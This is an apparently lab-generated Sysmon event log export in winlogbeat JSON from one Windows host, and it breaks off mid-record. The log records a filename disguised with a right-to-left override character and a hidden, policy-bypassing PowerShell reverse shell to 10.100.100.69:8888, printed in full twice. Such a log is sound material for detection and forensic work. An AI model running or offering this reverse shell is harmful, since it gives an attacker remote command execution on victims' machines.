    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331120",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "4464"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-7d25-5ecb-0000-001069410400}",
                    "SourceProcessId": "1152",
                    "SourceThreadId": "11192",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-7caf-5ecb-0000-0010ae9f0000}",
                    "TargetProcessId": "692",
                    "UtcTime": "2020-05-29 16:36:19.430"
                },
                "time_created": "2020-05-29T16:36:19.433290"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "1",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331121",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "4464"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "1",
                    "Version": "5"
                },
                "event_data": {
                    "CommandLine": "C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\Niubbo\\Desktop\\licit\u202egnp.bat\" \"",
                    "Company": "Microsoft Corporation",
                    "CurrentDirectory": "C:\\Users\\Niubbo\\Desktop\\",
                    "Description": "Windows Command Processor",
                    "FileVersion": "10.0.18362.449 (WinBuild.160101.0800)",
                    "Hashes": "MD5=D7AB69FAD18D4A643D84A271DFC0DBDF,SHA256=FF79D3C4A0B7EB191783C323AB8363EBD1FD10BE58D8BCC96B07067743CA81D5",
                    "Image": "C:\\Windows\\System32\\cmd.exe",
                    "IntegrityLevel": "Medium",
                    "LogonGuid": "{b9db5ea0-7df1-5ecb-0000-002061ac0d00}",
                    "LogonId": "0x00000000000dac61",
                    "OriginalFileName": "Cmd.Exe",
                    "ParentCommandLine": "C:\\WINDOWS\\Explorer.EXE",
                    "ParentImage": "C:\\Windows\\explorer.exe",
                    "ParentProcessGuid": "{b9db5ea0-7dfb-5ecb-0000-00109f9b0e00}",
                    "ParentProcessId": "5820",
                    "ProcessGuid": "{b9db5ea0-3a05-5ed1-0000-001065349c0c}",
                    "ProcessId": "1996",
                    "Product": "Microsoft\u00ae Windows\u00ae Operating System",
                    "RuleName": "None",
                    "TerminalSessionId": "2",
                    "User": "PC-NIUBBO\\Niubbo",
                    "UtcTime": "2020-05-29 16:36:21.525"
                },
                "time_created": "2020-05-29T16:36:21.533209"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "1",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331122",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "4464"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "1",
                    "Version": "5"
                },
                "event_data": {
                    "CommandLine": "powershell  -w hidden -ep bypass -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a='10.100.100.69';$p='8888';$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne -1){$o += $e.GetString($os.Read());if ($o -eq $str) {$o=''}};$s.Write($e.GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};",
                    "Company": "Microsoft Corporation",
                    "CurrentDirectory": "C:\\Users\\Niubbo\\Desktop\\",
                    "Description": "Windows PowerShell",
                    "FileVersion": "10.0.18362.1 (WinBuild.160101.0800)",
                    "Hashes": "MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53",
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "IntegrityLevel": "Medium",
                    "LogonGuid": "{b9db5ea0-7df1-5ecb-0000-002061ac0d00}",
                    "LogonId": "0x00000000000dac61",
                    "OriginalFileName": "PowerShell.EXE",
                    "ParentCommandLine": "C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\Niubbo\\Desktop\\licit\u202egnp.bat\" \"",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "ParentProcessGuid": "{b9db5ea0-3a05-5ed1-0000-001065349c0c}",
                    "ParentProcessId": "1996",
                    "ProcessGuid": "{b9db5ea0-3a05-5ed1-0000-00102b3e9c0c}",
                    "ProcessId": "6596",
                    "Product": "Microsoft\u00ae Windows\u00ae Operating System",
                    "RuleName": "None",
                    "TerminalSessionId": "2",
                    "User": "PC-NIUBBO\\Niubbo",
                    "UtcTime": "2020-05-29 16:36:21.691"
                },
                "time_created": "2020-05-29T16:36:21.695818"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "11",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331123",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "4464"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "11",
                    "Version": "2"
                },
                "event_data": {
                    "CreationUtcTime": "2020-05-29 16:36:21.835",
                    "Image": "C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "ProcessGuid": "{b9db5ea0-3a05-5ed1-0000-00102b3e9c0c}",
                    "ProcessId": "6596",
                    "RuleName": "None",
                    "TargetFilename": "C:\\Users\\Niubbo\\AppData\\Local\\Temp\\__PSScriptPolicyTest_je3q4yil.rl3.ps1",
                    "UtcTime": "2020-05-29 16:36:21.835"
                },
                "time_created": "2020-05-29T16:36:21.944626"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "1",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331124",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "4464"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "1",
                    "Version": "5"
                },
                "event_data": {
                    "CommandLine": "\"cmd.exe\"",
                    "Company": "Microsoft Corporation",
                    "CurrentDirectory": "C:\\Users\\Niubbo\\Desktop\\",
                    "Description": "Windows Command Processor",
                    "FileVersion": "10.0.18362.449 (WinBuild.160101.0800)",
                    "Hashes": "MD5=D7AB69FAD18D4A643D84A271DFC0DBDF,SHA256=FF79D3C4A0B7EB191783C323AB8363EBD1FD10BE58D8BCC96B07067743CA81D5",
                    "Image": "C:\\Windows\\System32\\cmd.exe",
                    "IntegrityLevel": "Medium",
                    "LogonGuid": "{b9db5ea0-7df1-5ecb-0000-002061ac0d00}",
                    "LogonId": "0x00000000000dac61",
                    "OriginalFileName": "Cmd.Exe",
                    "ParentCommandLine": "powershell  -w hidden -ep bypass -nop -c function RSC{if ($c.Connected -eq $true) {$c.Close()};if ($p.ExitCode -ne $null) {$p.Close()};exit;};$a='10.100.100.69';$p='8888';$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize;$p=New-Object System.Diagnostics.Process;$p.StartInfo.FileName='cmd.exe';$p.StartInfo.RedirectStandardInput=1;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0;$p.Start();$is=$p.StandardInput;$os=$p.StandardOutput;Start-Sleep 1;$e=new-object System.Text.AsciiEncoding;while($os.Peek() -ne -1){$o += $e.GetString($os.Read())};$s.Write($e.GetBytes($o),0,$o.Length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.Connected -ne $true) {RSC};$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) {$r=$s.Read($nb,$pos,$nb.Length - $pos);$pos+=$r;if (-not $pos -or $pos -eq 0) {RSC};if ($nb[0..$($pos-1)] -contains 10) {break}};if ($pos -gt 0){$str=$e.GetString($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.ExitCode -ne $null){RSC}else{$o=$e.GetString($os.Read());while($os.Peek() -ne -1){$o += $e.GetString($os.Read());if ($o -eq $str) {$o=''}};$s.Write($e.GetBytes($o),0,$o.length);$o=$null;$str=$null}}else{RSC}};",
                    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "ParentProcessGuid": "{b9db5ea0-3a05-5ed1-0000-00102b3e9c0c}",
                    "ParentProcessId": "6596",
                    "ProcessGuid": "{b9db5ea0-3a06-5ed1-0000-00100e539c0c}",
                    "ProcessId": "10388",
                    "Product": "Microsoft\u00ae Windows\u00ae Operating System",
                    "RuleName": "None",
                    "TerminalSessionId": "2",
                    "User": "PC-NIUBBO\\Niubbo",
                    "UtcTime": "2020-05-29 16:36:22.238"
                },
                "time_created": "2020-05-29T16:36:22.250488"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331125",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "4464"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-7d25-5ecb-0000-001069410400}",
                    "SourceProcessId": "1152",
                    "SourceThreadId": "11192",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-7caf-5ecb-0000-0010ae9f0000}",
                    "TargetProcessId": "692",
                    "UtcTime": "2020-05-29 16:36:22.460"
                },
                "time_created": "2020-05-29T16:36:22.474886"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331126",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "4464"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-7d25-5ecb-0000-001069410400}",
                    "SourceProcessId": "1152",
                    "SourceThreadId": "11192",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-7caf-5ecb-0000-0010ae9f0000}",
                    "TargetProcessId": "692",
                    "UtcTime": "2020-05-29 16:36:22.523"
                },
                "time_created": "2020-05-29T16:36:22.524567"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "3",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331127",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "3912"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "3",
                    "Version": "5"
                },
                "event_data": {
                    "DestinationHostname": "None",
                    "DestinationIp": "10.100.100.69",
                    "DestinationIsIpv6": "False",
                    "DestinationPort": "8888",
                    "DestinationPortName": "None",
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "Initiated": "True",
                    "ProcessGuid": "{b9db5ea0-3a05-5ed1-0000-00102b3e9c0c}",
                    "ProcessId": "6596",
                    "Protocol": "tcp",
                    "RuleName": "None",
                    "SourceHostname": "pc-niubbo.noobville.net",
                    "SourceIp": "10.100.100.11",
                    "SourceIsIpv6": "False",
                    "SourcePort": "10443",
                    "SourcePortName": "None",
                    "User": "PC-NIUBBO\\Niubbo",
                    "UtcTime": "2020-05-29 16:36:27.596"
                },
                "time_created": "2020-05-29T16:36:23.742098"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331128",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "4464"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-7d25-5ecb-0000-001069410400}",
                    "SourceProcessId": "1152",
                    "SourceThreadId": "11192",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-7caf-5ecb-0000-0010ae9f0000}",
                    "TargetProcessId": "692",
                    "UtcTime": "2020-05-29 16:36:25.553"
                },
                "time_created": "2020-05-29T16:36:25.567041"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331129",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "4464"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
                    "CallTrace": "C:\\WINDOWS\\SYSTEM32\\ntdll.dll+9c534|C:\\WINDOWS\\System32\\KERNELBASE.dll+2726e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+f46e|C:\\WINDOWS\\system32\\wbem\\cimwin32.dll+faf5|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+55a2|C:\\WINDOWS\\SYSTEM32\\framedynos.dll+6d2d|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8ad1|C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe+8753|C:\\WINDOWS\\System32\\RPCRT4.dll+76953|C:\\WINDOWS\\System32\\RPCRT4.dll+1364b|C:\\WINDOWS\\System32\\combase.dll+a2c02|C:\\WINDOWS\\System32\\RPCRT4.dll+59a7b|C:\\WINDOWS\\System32\\combase.dll+2f163|C:\\WINDOWS\\System32\\combase.dll+2ef53|C:\\WINDOWS\\System32\\combase.dll+a5796|C:\\WINDOWS\\System32\\combase.dll+4884a|C:\\WINDOWS\\System32\\combase.dll+a16bd|C:\\WINDOWS\\System32\\combase.dll+5719c|C:\\WINDOWS\\System32\\combase.dll+57a01|C:\\WINDOWS\\System32\\combase.dll+591a8|C:\\WINDOWS\\System32\\RPCRT4.dll+548c8|C:\\WINDOWS\\System32\\RPCRT4.dll+2c921|C:\\WINDOWS\\System32\\RPCRT4.dll+2c470|C:\\WINDOWS\\System32\\RPCRT4.dll+1a6bf",
                    "GrantedAccess": "0x00001410",
                    "RuleName": "None",
                    "SourceImage": "C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe",
                    "SourceProcessGUID": "{b9db5ea0-7d25-5ecb-0000-001069410400}",
                    "SourceProcessId": "1152",
                    "SourceThreadId": "11192",
                    "TargetImage": "C:\\WINDOWS\\system32\\lsass.exe",
                    "TargetProcessGUID": "{b9db5ea0-7caf-5ecb-0000-0010ae9f0000}",
                    "TargetProcessId": "692",
                    "UtcTime": "2020-05-29 16:36:25.616"
                },
                "time_created": "2020-05-29T16:36:25.616941"
            }
        },
        "_type": "_doc"
    },
    {
        "_index": "winlogbeat",
        "_score": 1.0,
        "_source": {
            "meta": {},
            "winlog": {
                "@xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
                "System": {
                    "Channel": "Microsoft-Windows-Sysmon/Operational",
                    "Computer": "pc-niubbo.noobville.net",
                    "Correlation": {
                        "@ActivityID": "",
                        "@RelatedActivityID": ""
                    },
                    "EventID": {
                        "#text": "10",
                        "@Qualifiers": ""
                    },
                    "EventRecordID": "331130",
                    "Execution": {
                        "@ProcessID": "3268",
                        "@ThreadID": "4464"
                    },
                    "Keywords": "0x8000000000000000",
                    "Level": "4",
                    "Opcode": "0",
                    "Provider": {
                        "@Guid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
                        "@Name": "Microsoft-Windows-Sysmon"
                    },
                    "Security": {
                        "@UserID": "S-1-5-18"
                    },
                    "Task": "10",
                    "Version": "3"
                },
                "event_data": {
